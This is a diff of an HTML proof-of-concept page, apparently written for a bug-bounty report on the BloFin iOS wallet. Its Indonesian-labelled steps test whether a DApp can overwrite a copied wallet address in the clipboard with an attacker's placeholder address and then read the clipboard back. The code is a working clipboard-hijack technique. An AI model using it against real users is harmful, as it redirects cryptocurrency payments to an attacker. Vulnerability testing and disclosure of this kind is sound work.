@@ -2,53 +2,62 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>BloFin v5 Clipboard - 0x403for</title>
-<style>body{background:#000;color:#ddd;font-family:monospace;padding:12px;font-size:12px}h3{color:#f5c518}button{width:100%;padding:14px;margin:6px 0;background:#f5c518;color:#000;font-weight:bold;border:none;border-radius:10px}pre{background:#111;border:1px solid #333;padding:10px;border-radius:8px;white-space:pre-wrap;word-break:break-all;color:#0ff;min-height:120px}input{width:100%;padding:10px;background:#222;color:#fff;border:1px solid #444;border-radius:6px;margin:6px 0}</style>
+<title>BloFin v5 Final PoC - 0x403for</title>
+<style>
+body{background:#000;color:#ddd;font-family:monospace;padding:12px;font-size:13px}
+h3{color:#f5c518} 
+.box{background:#111;border:1px solid #333;padding:12px;border-radius:10px;margin:10px 0}
+button{width:100%;padding:14px;margin:6px 0;background:#f5c518;color:#000;font-weight:bold;border:none;border-radius:10px;font-size:13px}
+pre{background:#000;border:1px solid #333;padding:10px;border-radius:8px;white-space:pre-wrap;word-break:break-all;color:#0ff;min-height:80px}
+span{color:#888;font-size:11px}
+</style>
 </head>
 <body>
-<h3>BloFin iOS v5 - Clipboard Hijack Test</h3>
-<input id="custom" value="0x403for_clipboard_test_blofin_1.8.5">
-<button onclick="testWrite()">1. Test clipboard.writeText</button>
-<button onclick="testRead()">2. Test clipboard.readText</button>
-<button onclick="testPaste()">3. Test paste hijack simulation</button>
-<pre id="log">Ready - BloFin iOS 1.8.5 - klik tombol harus pakai gesture user</pre>
-<script>
-const l = document.getElementById('log');
-const out = (m)=>{ l.innerText += "\n"+m; console.log(m); };
+<h3>BloFin iOS v5 Final PoC - Clipboard Hijack</h3>
 
-async function testWrite(){
- const txt = document.getElementById('custom').value;
- out("\n=== TEST 1 writeText ===");
- out("> Trying to write: "+txt);
+<div class="box">
+<span>Alamat TUJUAN ASLI yang di-copy user (simulasi dari Notes):</span>
+<pre id="victim">0x1111111111111111111111111111111111111111</pre>
+<button onclick="copyVictim()">1. COPY alamat asli (simulasi user copy)</button>
+</div>
+
+<div class="box">
+<span>Alamat OVERWRITE oleh DApp jahat (simulasi attacker):</span>
+<pre id="attacker">0x403forTEST_BloFin_Clipboard_Hijack_1_8_5</pre>
+<button onclick="hijack()">2. OVERWRITE clipboard (aksi DApp jahat)</button>
+</div>
+
+<div class="box">
+<span>Hasil clipboard sekarang (paste di sini untuk cek):</span>
+<pre id="log">Belum ada aksi - Ready BloFin iOS 1.8.5</pre>
+<button onclick="check()">3. CHECK isi clipboard sekarang</button>
+</div>
+
+<script>
+const log = document.getElementById('log');
+const out = (m)=>{ log.innerText = m; console.log(m); }
+
+async function copyVictim(){
+ const txt = document.getElementById('victim').innerText;
  try{
   await navigator.clipboard.writeText(txt);
-  out("writeText SUCCESS - BloFin allows DApp to overwrite clipboard!");
-  out("=> Jika SUCCESS tanpa popup = bug Medium. DApp bisa ganti alamat wallet pas user copy.");
- }catch(e){
-  out("writeText BLOCKED (SECURE): "+e.message);
-  out("=> Secure, BloFin block clipboard hijack");
- }
+  out("STEP 1 SUCCESS: User copy alamat asli\n"+txt+"\n\nSekarang clipboard berisi alamat ASLI.");
+ }catch(e){ out("STEP 1 BLOCKED (SECURE): "+e.message); }
 }
 
-async function testRead(){
- out("\n=== TEST 2 readText ===");
- out("> Trying to read clipboard...");
+async function hijack(){
+ const txt = document.getElementById('attacker').innerText;
+ try{
+  await navigator.clipboard.writeText(txt);
+  out("STEP 2 SUCCESS (BUG!): DApp berhasil OVERWRITE clipboard!\nMenjadi:\n"+txt+"\n\n=> Jika user paste di halaman Send BloFin, dana akan terkirim ke alamat overwrite, bukan alamat asli!");
+ }catch(e){ out("STEP 2 BLOCKED (SECURE): "+e.message); }
+}
+
+async function check(){
  try{
   const t = await navigator.clipboard.readText();
-  out("readText SUCCESS: "+t.slice(0,100));
-  out("=> Jika SUCCESS tanpa permission = privacy leak! DApp bisa baca copy-an user.");
- }catch(e){
-  out("readText BLOCKED (SECURE): "+e.message);
-  out("=> Secure, butuh permission");
- }
-}
-
-async function testPaste(){
- out("\n=== TEST 3 Paste Hijack Simulation ===");
- out("1. Copy alamat asli di app lain dulu");
- out("2. Klik tombol TEST 1 tadi, itu akan overwrite clipboard kamu");
- out("3. Coba paste di notes - apakah alamat berubah jadi 0x403for_...?");
- out("Jika berubah = BloFin rentan clipboard hijack");
+  out("STEP 3 CHECK: Isi clipboard sekarang:\n"+t);
+ }catch(e){ out("CHECK BLOCKED: "+e.message); }
 }
 </script>
 </body>
